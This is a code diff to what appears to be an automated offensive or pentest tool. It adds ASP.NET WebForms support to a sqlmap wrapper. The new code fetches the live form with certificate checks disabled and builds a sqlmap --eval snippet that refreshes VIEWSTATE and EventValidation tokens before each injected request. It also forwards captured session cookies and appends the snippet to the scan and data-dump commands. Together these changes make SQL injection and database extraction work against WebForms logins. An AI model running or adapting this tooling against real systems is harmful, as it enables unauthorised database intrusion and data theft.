@@ -6977,6 +6977,78 @@ def run_sqlmap_request_file(req_file: str, domain: str | None = None,
     effective_domain = domain or host_from_file or "unknown"
     log("info", f"Target: {effective_domain}  {method_from_file} {path_from_file}")
 
+    # ── ASP.NET WebForms support (gap fix) ───────────────────────────────────
+    # __VIEWSTATE / __EVENTVALIDATION / __VIEWSTATEGENERATOR are server-VALIDATED on
+    # every postback; the stale copies in a captured request file are rejected BEFORE
+    # the query runs, so sqlmap silently tests nothing and reports a false negative.
+    # sqlmap's --eval runs Python before EACH request with the POST params as variables;
+    # re-fetch the form URL and reassign all three so every mutated request carries
+    # fresh, valid tokens. (Found on a real IIS/WebForms login; tokens here are not
+    # session-bound — for ViewStateUserKey-bound apps a cookie-sharing variant is needed.)
+    webforms_eval = ""
+    _body = ""
+    if "\r\n\r\n" in raw:
+        _body = raw.split("\r\n\r\n", 1)[1]
+    elif "\n\n" in raw:
+        _body = raw.split("\n\n", 1)[1]
+    # Treat as WebForms only when __VIEWSTATE is an actual POST-BODY param (not a substring
+    # in a header/comment), and we know the host.
+    if "__VIEWSTATE=" in (_body or "") and host_from_file:
+        # Form URL: honour an absolute-form request line; else scheme + host + path
+        # (https unless the Host header pins :80).
+        if path_from_file.lower().startswith(("http://", "https://")):
+            _form_url = path_from_file
+        else:
+            _scheme = "http" if host_from_file.endswith(":80") else "https"
+            _form_url = f"{_scheme}://{host_from_file}{path_from_file}"
+        # Forward the captured session cookies so session-bound tokens still validate.
+        _cookie_hdr = ""
+        for _ln in raw.split("\n"):
+            if _ln.lower().startswith("cookie:"):
+                _cookie_hdr = _ln.split(":", 1)[1].strip()
+                break
+        _tok_re = lambda n, html: (lambda m: m.group(1) if m else None)(
+            _re.search('"' + n + '"[^>]*value="([^"]*)"', html))
+        # PRE-FLIGHT (fail-closed): confirm all three tokens are actually extractable from a
+        # fresh fetch. If not, do NOT enable the refresh — a scan with stale/empty tokens
+        # would scan rejected postbacks and FALSE-NEGATIVE (the very bug this fixes).
+        _wf_ok = False
+        try:
+            import requests as _rqf
+            try:
+                _rqf.packages.urllib3.disable_warnings()
+            except Exception:
+                pass
+            _pf = _rqf.get(_form_url, verify=False, timeout=15,
+                           headers={"User-Agent": "Mozilla/5.0", "Cookie": _cookie_hdr}).text
+            _wf_ok = all(_tok_re(n, _pf) for n in
+                         ("__VIEWSTATE", "__EVENTVALIDATION", "__VIEWSTATEGENERATOR"))
+        except Exception:
+            _wf_ok = False
+        if not _wf_ok:
+            log("warn", f"ASP.NET WebForms detected but token pre-flight FAILED ({_form_url}) "
+                        "— NOT enabling auto-refresh (a stale-token scan would false-negative). "
+                        "Verify the form URL / session binding manually.")
+        else:
+            # json.dumps makes the URL + cookie SAFE Python string literals — a quote/backslash
+            # in the request-file path can no longer break out and execute code in sqlmap's
+            # --eval on the OPERATOR BOX (codex+grok: critical RCE in the first cut). Stdlib
+            # urllib so the eval runs even where sqlmap's python lacks `requests`.
+            _ec = (
+                "import urllib.request as _U,re as _R,ssl as _SS; "
+                "_cx=_SS.create_default_context(); _cx.check_hostname=False; _cx.verify_mode=_SS.CERT_NONE; "
+                f"_rq=_U.Request({json.dumps(_form_url)},headers={{'User-Agent':'Mozilla/5.0','Cookie':{json.dumps(_cookie_hdr)}}}); "
+                "_vsT=_U.urlopen(_rq,timeout=15,context=_cx).read().decode('utf-8','replace'); "
+                "_g=lambda n:(lambda m:m.group(1) if m else None)(_R.search('\"'+n+'\"[^>]*value=\"([^\"]*)\"',_vsT)); "
+                "__VIEWSTATE=_g('__VIEWSTATE') or __VIEWSTATE; "
+                "__EVENTVALIDATION=_g('__EVENTVALIDATION') or __EVENTVALIDATION; "
+                "__VIEWSTATEGENERATOR=_g('__VIEWSTATEGENERATOR') or __VIEWSTATEGENERATOR"
+            )
+            import shlex as _shlex0
+            webforms_eval = " --eval=" + _shlex0.quote(_ec)
+            log("ok", f"ASP.NET WebForms detected ({_form_url}) — auto-refreshing "
+                      "VIEWSTATE/EventValidation per request (token pre-flight OK)")
+
     if not _which("sqlmap"):
         log("warn", "sqlmap not installed — brew install sqlmap")
         return False
@@ -7025,7 +7097,7 @@ def run_sqlmap_request_file(req_file: str, domain: str | None = None,
         ).strip()
 
     tamper_clause = f'--tamper={_shlex.quote(tamper)} ' if tamper else ''
-    cmd = _build(tamper_clause)
+    cmd = _build(tamper_clause) + webforms_eval
 
     log("info", f"Running: {cmd}")
     # pty_stdin=True is REQUIRED here: sqlmap's `-r` (request-file) mode silently
@@ -7049,7 +7121,7 @@ def run_sqlmap_request_file(req_file: str, domain: str | None = None,
         log("warn", "Dump extraction failed with tampers active (blank/errored) — "
                     "retrying WITHOUT tampers (--fresh-queries); tampers can corrupt "
                     "the heavier data-extraction payloads")
-        cmd2 = _build('', '--fresh-queries')
+        cmd2 = _build('', '--fresh-queries') + webforms_eval
         log("info", f"Running: {cmd2}")
         ok2, out2 = run_cmd(cmd2, timeout=2400, watch_file=sqli_dir,
                             watch_phase="SQLMAP-RF-NOTAMPER", pty_stdin=True)
